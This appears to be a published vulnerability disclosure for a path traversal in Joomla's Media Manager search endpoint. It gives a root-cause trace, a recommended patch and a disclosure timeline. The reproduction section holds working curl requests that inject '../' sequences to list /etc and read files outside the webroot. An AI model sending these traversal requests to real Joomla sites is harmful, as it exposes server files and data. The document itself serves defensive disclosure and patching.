<!-- source: https://red.anthropic.com/2026/cvd/findings/ANT-2026-GSV3GS1G -->

# ANT-2026-GSV3GS1G · joomla/joomla-cms

## path-traversal medium

[CVE-2026-40384](https://nvd.nist.gov/vuln/detail/CVE-2026-40384)
[GHSA-hr66-rv65-f5r4](https://github.com/advisories/GHSA-hr66-rv65-f5r4)

Maintainer medium

Anthropic's analysis, sealed at approval. Disclosure to the maintainer was performed by Doyensec.

# ANT-2026-GSV3GS1G: Path Traversal via Glob Injection in com\_media Search

The Joomla Media Manager (`com_media`) exposes a file search endpoint that passes the user-supplied `search` parameter directly into a `glob()` pattern without sanitization. While the `path` parameter is properly validated via `Path::check()` (which rejects `..`), the `search` parameter receives no such validation.

An **Author-level** user (Joomla's default content-creation group, which has `core.create` on `com_media`) can inject `../` sequences into the `search` parameter to escape the media sandbox (`/images`) and:

1. **Enumerate the entire server filesystem** — directories are never filtered
2. **Read the contents** of any file with an allowed media extension (`.txt`, `.csv`, `.pdf`, `.doc`, `.xls`, `.jpg`, `.png`, etc.) **anywhere on the filesystem**, including outside the webroot

This breaks the fundamental security boundary of the media adapter, which is supposed to jail all operations inside the configured media root (`/var/www/html/images`).

**Project:** joomla/joomla-cms
**Commit:** `b794d03bd42cf8ba`

The root cause is that LocalAdapter::search() builds `$pattern = Path::clean($this->getLocalPath($path) . '/*' . $needle . '*')` where `$needle` is attacker-controlled and unvalidated; Path::clean() only normalizes slashes and does not strip `..`, and PHP's glob() resolves `..` segments during pattern expansion. The existing Path::check() guard is applied only to `$path`, not to the search needle, so the sandbox boundary is enforced on the wrong input.

This finding was identified by static analysis and has not yet been dynamically reproduced. The Technical Details section above describes the code path; a trigger input is not included.

This vulnerability was discovered by Claude, Anthropic's AI assistant, and triaged by the Anthropic security team in collaboration with Anthropic Research. Please direct questions to security-cvd@anthropic.com and reference ANT-2026-GSV3GS1G.

---

**Reference:** ANT-2026-GSV3GS1G

Triage and disclosure were performed by Doyensec. The writeup below is the document the firm sent to the maintainer.

## Vulnerability Header

| Field | Value |
| --- | --- |
| Vulnerability Title | Path Traversal via Glob Injection in com\_media Search Parameter |
| Severity Rating | High |
| Bug Category | Path Traversal |
| Location | `plugins/filesystem/local/src/Adapter/LocalAdapter.php:749`, `search()` |
| Affected Versions | Joomla 6.0.4 |

## Executive Summary

The `search` parameter in Joomla's Media Manager API (`com_media`) is concatenated directly into a `glob()` pattern at `LocalAdapter::search()` without any path validation. While the `path` parameter is correctly protected by `Path::check()` (which rejects `..` sequences), the `search` parameter receives no such validation — only the `STRING` input filter is applied, which strips HTML tags but not path separators or traversal sequences. An Author-level user (the lowest content-creation role in Joomla's default ACL) can inject `/../../../../../` into `search` to escape the `/images/` media sandbox, enumerate the entire server filesystem, and read the contents of any file with an allowed media extension (`.txt`, `.csv`, `.pdf`, `.doc`, `.xls`, images, etc.) anywhere on disk. The `isMediaFile()` extension filter blocks `.php`, `.conf`, `.key`, `.pem`, and extensionless files, which prevents direct credential theft from files like `configuration.php` or `/etc/passwd` — but `.txt`/`.csv` backups and exports are fully readable.

## Root Cause Analysis

### Technical Description

The Media Manager exposes a file search endpoint via `ApiController::getFiles()`. The `search` parameter flows through the model unchanged and reaches `LocalAdapter::search()`, where it is concatenated into a `glob()` pattern:

```
// plugins/filesystem/local/src/Adapter/LocalAdapter.php:747-764
public function search(string $path, string $needle, bool $recursive = false): array
    $pattern = Path::clean($this->getLocalPath($path) . '/*' . $needle . '*');
    //                      ^^^^^^^^^^^^^^^^^^^^^^^^^^         ^^^^^^^
    //                      Validated (Path::check)            NOT validated

    if ($recursive) {
        $results = $this->rglob($pattern);
    } else {
        $results = glob($pattern);   // glob() resolves `..` during pattern expansion

    $searchResults = [];
    foreach ($results as $result) {
        $searchResults[] = $this->getPathInformation($result);
    return $searchResults;
```

PHP's `glob()` resolves `..` segments during pattern matching. Given media root `/var/www/html/images` with default subdirectories `banners/`, `headers/`, `sampledata/`:

```
Pattern:  /var/www/html/images/*/../../../../../etc/*
          │                    │  │
          │                    │  └─ 5 × `..` climbs to `/`
          │                    └─ matches banners, headers, sampledata
          └─ rootPath (trusted)

Resolves to → /etc/*
```

The `Path::clean()` call only normalizes directory separators — it does **not** strip `..` (unlike `Path::check()`, which throws on traversal sequences). The `STRING` input filter at the controller strips HTML tags only; `/`, `.`, `..` all pass through.

When `content=1` is supplied, the traversal path flows into `LocalAdapter::getResource()` at line 212, which performs a raw `fopen($this->rootPath . '/' . $path, 'r')` with no path validation — enabling actual file content read, not just enumeration. The file content is returned as the base64-encoded `content` attribute.

### First Faulty Condition

| File | `plugins/filesystem/local/src/Adapter/LocalAdapter.php` |
| --- | --- |
| Line | 749 |
| Condition | `$needle` (user-supplied search term) is concatenated into the glob pattern without any path validation or sanitization. Every other path-accepting method in `LocalAdapter` routes through `getLocalPath()` → `Path::check()`. The `search()` method is the only one that concatenates user input *after* the `getLocalPath()` call. |

### Trace Analysis

1. `ApiController::getFiles()` at `administrator/components/com_media/src/Controller/ApiController.php:128` — `$options['search'] = $this->input->getString('search', '')` accepts the search term with `STRING` filter only (strips HTML, not path chars).
2. `ApiModel::getFiles()` at `administrator/components/com_media/src/Model/ApiModel.php:110-112` — forwards `$options['search']` as `$needle` to the adapter unchanged.
3. `ApiModel::search()` at `ApiModel.php:430-433` — `return $this->getAdapter($adapter)->search($path, $needle, $recursive)` — still unchanged.
4. `LocalAdapter::search()` at `LocalAdapter.php:749` — `$pattern = Path::clean($this->getLocalPath($path) . '/*' . $needle . '*')` — `$needle` concatenated raw into glob pattern.
5. `LocalAdapter.php:754` — `$results = glob($pattern)` — `glob()` resolves `..` during pattern matching, escaping the sandbox.
6. `LocalAdapter::getResource()` at `LocalAdapter.php:212` — `fopen($this->rootPath . '/' . $path, 'r')` — when `content=1` is set, the traversal path from glob results enables actual file content read with no `Path::check()`.

## Exploitability Assessment

### Attack Vector & Reachability

| Attack vector | Network |
| --- | --- |
| Authentication required | Low |
| User interaction required | None |
| Reachable in default config | Yes |
| Entry point(s) | `GET /index.php?option=com_media&task=api.files&format=json&path=local-images:/&search=/../../../../../{target}&recursive=0&content=1&mediatypes=0,1,2,3` |

The attacker can enumerate every directory on the filesystem with no filtering, and read the full contents of any file matching the allowed extension set. A standard file-system permissions apply. While the extension filter prevents reading `.php` config files or `/etc/passwd` directly, the readable set is broad enough to capture `configuration.php.txt` backups, `.csv` database exports, `.txt` cron scripts, and private documents stored outside the webroot. Directory enumeration alone reveals installed software versions, backup locations, and system layout useful for targeting other vulnerabilities.

### Reproduction Steps

**Environment**
The issue was reproduced using Joomla 6.0.4 on Ubuntu 24.04.4 LTS.

**Prerequisites:**
An Author-level Joomla account (group 3). This is the minimum content-creation role, commonly granted to contributors on multi-author sites.

**Steps to reproduce**:

```
# 1. Log in as Author user, obtain session cookie
curl -s -L -c cookies.txt "http://TARGET/index.php/component/users/login" -o login.html
CSRF=$(grep -oE 'csrf.token":"[a-f0-9]{32}"' login.html | head -1 | grep -oE '[a-f0-9]{32}')
curl -s -b cookies.txt -c cookies.txt \
    "http://TARGET/index.php" \
    --data-urlencode "username=AUTHOR_USER" \
    --data-urlencode "password=AUTHOR_PASS" \
    -d "option=com_users&task=user.login&return=aW5kZXgucGhw&${CSRF}=1"

# 2. CONTROL: Verify traversal in `path` parameter is blocked
curl -s -b cookies.txt \
    "http://TARGET/index.php?option=com_media&task=api.files&format=json&path=local-images%3A%2F..%2F..%2Fetc&mediatypes=0%2C1%2C2%2C3"
# Expected: 400 Bad Request — "Use of relative paths not permitted"

# 3. EXPLOIT: Directory enumeration via traversal in `search` parameter
curl -s -b cookies.txt \
    "http://TARGET/index.php?option=com_media&task=api.files&format=json&path=local-images%3A%2F&search=%2F..%2F..%2F..%2F..%2F..%2Fetc%2F&recursive=0&mediatypes=0%2C1%2C2%2C3"
# Expected: 200 OK with JSON listing /etc/ directory contents

# 4. EXPLOIT: File content read outside webroot
curl -s -b cookies.txt \
    "http://TARGET/index.php?option=com_media&task=api.files&format=json&path=local-images%3A%2F&search=%2F..%2F..%2F..%2F..%2F..%2Fusr%2Flib%2Fpython3.12%2FLICENSE.txt&recursive=0&content=1&mediatypes=0%2C1%2C2%2C3"
# Expected: 200 OK with base64-encoded file content in the "content" field
```

**Expected output:**

Steps 2 vs 3 form the clean differential: identical privilege level, identical traversal sequence, only the parameter name differs. `path` is validated by `Path::check()`; `search` is not.
Step 3 returns ~144 results listing `/etc/` directories.
Step 4 returns file contents as base64 in the JSON response.

PoC files

* `poc.py` — Python 3 script that creates an Author user (setup via DB), logs in via HTTP, runs baseline controls and exploit cases, and verifies file content byte-matches disk. Run with `python3 poc.py`.

## Recommended Fix

**Option 1 (primary) — Validate `$needle` in `LocalAdapter::search()`:** A search term is semantically a filename fragment, not a path. Reject path separators and escape glob metacharacters:

```
public function search(string $path, string $needle, bool $recursive = false): array
    // Search term must be a filename fragment, not a path
    if (preg_match('#[/\\\\]#', $needle) || str_contains($needle, '..')) {
        throw new InvalidPathException('Search term may not contain path separators');

    // Escape glob metacharacters so the term is matched literally
    $needle = addcslashes($needle, '*?[]{}\\');

    $pattern = Path::clean($this->getLocalPath($path) . '/*' . $needle . '*');
    // ... rest unchanged
```

**Option 2 (defense in depth) — Validate glob results against `rootPath`:** Even if `$needle` is cleaned, validate each glob result to ensure it hasn't escaped the sandbox:

```
foreach ($results as $result) {
    $real = realpath($result);
    if ($real === false || !str_starts_with($real . '/', $this->rootPath . '/')) {
        continue;   // result escaped the sandbox — discard
    $searchResults[] = $this->getPathInformation($real);
```

**Option 3 (harden `getResource()`):** Route through the existing `getLocalPath()` → `Path::check()` guard like every other method in `LocalAdapter`:

```
public function getResource(string $path)
    return fopen($this->getLocalPath($path), 'r');   // goes through Path::check()
```

This single-line change would block the `content=1` file read even if the glob traversal remains, because the traversal path would fail `Path::check()`.

Patch provenance: AI-generated + Human-reviewed

## References

* CWE-22: Improper Limitation of a Pathname to a Restricted Directory ('Path Traversal')
* CVE-2019-10945 — prior com\_media directory traversal in Joomla <=3.9.4 (`folder` parameter, different codebase)
* CVE-2020-24597 — prior com\_media traversal in Joomla <=3.9.20 (root-path config, different architecture)

## Attribution

This vulnerability was discovered by Claude, Anthropic's AI assistant, and triaged by **Adrian Denkiewicz** at **Doyensec** in collaboration with Anthropic Research.

For CVE credits and public acknowledgments: **Doyensec in collaboration with Claude and Anthropic Research**

## Attachment: `diff.patch`

```
diff --git a/plugins/filesystem/local/src/Adapter/LocalAdapter.php b/plugins/filesystem/local/src/Adapter/LocalAdapter.php
index 9f8ecd9..74e48d9 100644
--- a/plugins/filesystem/local/src/Adapter/LocalAdapter.php
+++ b/plugins/filesystem/local/src/Adapter/LocalAdapter.php
@@ -209,7 +209,7 @@ class LocalAdapter implements AdapterInterface
      */
     public function getResource(string $path)
-        return fopen($this->rootPath . '/' . $path, 'r');
+        return fopen($this->getLocalPath($path), 'r');

     /**
@@ -746,6 +746,14 @@ class LocalAdapter implements AdapterInterface
      */
     public function search(string $path, string $needle, bool $recursive = false): array
+        // Search term must be a filename fragment, not a path
+        if (preg_match('#[/\\\\]#', $needle) || str_contains($needle, '..')) {
+            throw new InvalidPathException('Search term may not contain path separators');
+        }
+
+        // Escape glob metacharacters so the term is matched literally
+        $needle = addcslashes($needle, '*?[]{}\\');
+
         $pattern = Path::clean($this->getLocalPath($path) . '/*' . $needle . '*');

         if ($recursive) {
@@ -757,7 +765,13 @@ class LocalAdapter implements AdapterInterface
         $searchResults = [];

         foreach ($results as $result) {
-            $searchResults[] = $this->getPathInformation($result);
+            $real = realpath($result);
+
+            if ($real === false || !str_starts_with($real . '/', $this->rootPath . '/')) {
+                continue;
+            }
+
+            $searchResults[] = $this->getPathInformation($real);

         return $searchResults;
```

1. 2026-03-30
2. 2026-04-23
3. 2026-05-07
4. 2026-05-28
5. 2026-05-28

d7de4969efd4f3d7e9c4921183300a215f7ed12cf7cc72a058f666216d45394f963e93d1e9c78a2e73dcd3471c8548e8160cef16bacaed927db723f7e4ea78f5

Committed 2026-04-23 07:04 UTC

Revealed 2026-05-28 18:00 UTC

[Verify (download preimage.json)](data:application/json;charset=utf-8,%7B%22ant_id%22%3A%22ANT-2026-GSV3GS1G%22%2C%22bug_class%22%3A%22Path-traversal%22%2C%22claude_severity%22%3A%22high%22%2C%22commit_sha%22%3A%22b794d03bd42cf8ba%22%2C%22created_at%22%3A%222026-03-30T23%3A19%3A37%2B00%3A00%22%2C%22description%22%3A%22The%20Joomla%20Media%20Manager%20%28%60com_media%60%29%20exposes%20a%20file%20search%20endpoint%20that%20passes%20the%20user-supplied%20%60search%60%20parameter%20directly%20into%20a%20%60glob%28%29%60%20pattern%20without%20sanitization.%20While%20the%20%60path%60%20parameter%20is%20properly%20validated%20via%20%60Path%3A%3Acheck%28%29%60%20%28which%20rejects%20%60..%60%29%2C%20the%20%60search%60%20parameter%20receives%20no%20such%20validation.%5Cn%5CnAn%20%2A%2AAuthor-level%2A%2A%20user%20%28Joomla%27s%20default%20content-creation%20group%2C%20which%20has%20%60core.create%60%20on%20%60com_media%60%29%20can%20inject%20%60../%60%20sequences%20into%20the%20%60search%60%20parameter%20to%20escape%20the%20media%20sandbox%20%28%60/images%60%29%20and%3A%5Cn%5Cn1.%20%2A%2AEnumerate%20the%20entire%20server%20filesystem%2A%2A%20%E2%80%94%20directories%20are%20never%20filtered%5Cn2.%20%2A%2ARead%20the%20contents%2A%2A%20of%20any%20file%20with%20an%20allowed%20media%20extension%20%28%60.txt%60%2C%20%60.csv%60%2C%20%60.pdf%60%2C%20%60.doc%60%2C%20%60.xls%60%2C%20%60.jpg%60%2C%20%60.png%60%2C%20etc.%29%20%2A%2Aanywhere%20on%20the%20filesystem%2A%2A%2C%20including%20outside%20the%20webroot%5Cn%5CnThis%20breaks%20the%20fundamental%20security%20boundary%20of%20the%20media%20adapter%2C%20which%20is%20supposed%20to%20jail%20all%20operations%20inside%20the%20configured%20media%20root%20%28%60/var/www/html/images%60%29.%22%2C%22discovered_at%22%3Anull%2C%22location%22%3Anull%2C%22poc_sha256%22%3A%222582bdc36655e31e92c9e5397a55a7315b2ba50f0c5c176e25ad0f5299285bb0%22%2C%22preimage_version%22%3A1%2C%22project%22%3A%22joomla%22%2C%22reproduction%22%3Anull%2C%22technical_details%22%3A%22The%20root%20cause%20is%20that%20LocalAdapter%3A%3Asearch%28%29%20builds%20%60%24pattern%20%3D%20Path%3A%3Aclean%28%24this-%3EgetLocalPath%28%24path%29%20.%20%27/%2A%27%20.%20%24needle%20.%20%27%2A%27%29%60%20where%20%60%24needle%60%20is%20attacker-controlled%20and%20unvalidated%3B%20Path%3A%3Aclean%28%29%20only%20normalizes%20slashes%20and%20does%20not%20strip%20%60..%60%2C%20and%20PHP%27s%20glob%28%29%20resolves%20%60..%60%20segments%20during%20pattern%20expansion.%20The%20existing%20Path%3A%3Acheck%28%29%20guard%20is%20applied%20only%20to%20%60%24path%60%2C%20not%20to%20the%20search%20needle%2C%20so%20the%20sandbox%20boundary%20is%20enforced%20on%20the%20wrong%20input.%22%2C%22title%22%3A%22Path%20Traversal%20via%20Glob%20Injection%20in%20com_media%20Search%22%2C%22vendor_severity%22%3A%22high%22%7D)

```
  "ant_id": "ANT-2026-GSV3GS1G",
  "bug_class": "Path-traversal",
  "commit_sha": "b794d03bd42cf8ba",
  "created_at": "2026-03-30T23:19:37+00:00",
  "description": "The Joomla Media Manager (`com_media`) exposes a file search endpoint that passes the user-supplied `search` parameter directly into a `glob()` pattern without sanitization. While the `path` parameter is properly validated via `Path::check()` (which rejects `..`), the `search` parameter receives no such validation.\n\nAn **Author-level** user (Joomla's default content-creation group, which has `core.create` on `com_media`) can inject `../` sequences into the `search` parameter to escape the media sandbox (`/images`) and:\n\n1. **Enumerate the entire server filesystem** — directories are never filtered\n2. **Read the contents** of any file with an allowed media extension (`.txt`, `.csv`, `.pdf`, `.doc`, `.xls`, `.jpg`, `.png`, etc.) **anywhere on the filesystem**, including outside the webroot\n\nThis breaks the fundamental security boundary of the media adapter, which is supposed to jail all operations inside the configured media root (`/var/www/html/images`).",
  "location": null,
  "poc_sha256": "2582bdc36655e31e92c9e5397a55a7315b2ba50f0c5c176e25ad0f5299285bb0",
  "project": "joomla",
  "technical_details": "The root cause is that LocalAdapter::search() builds `$pattern = Path::clean($this->getLocalPath($path) . '/*' . $needle . '*')` where `$needle` is attacker-controlled and unvalidated; Path::clean() only normalizes slashes and does not strip `..`, and PHP's glob() resolves `..` segments during pattern expansion. The existing Path::check() guard is applied only to `$path`, not to the search needle, so the sandbox boundary is enforced on the wrong input.",
  "title": "Path Traversal via Glob Injection in com_media Search",
```
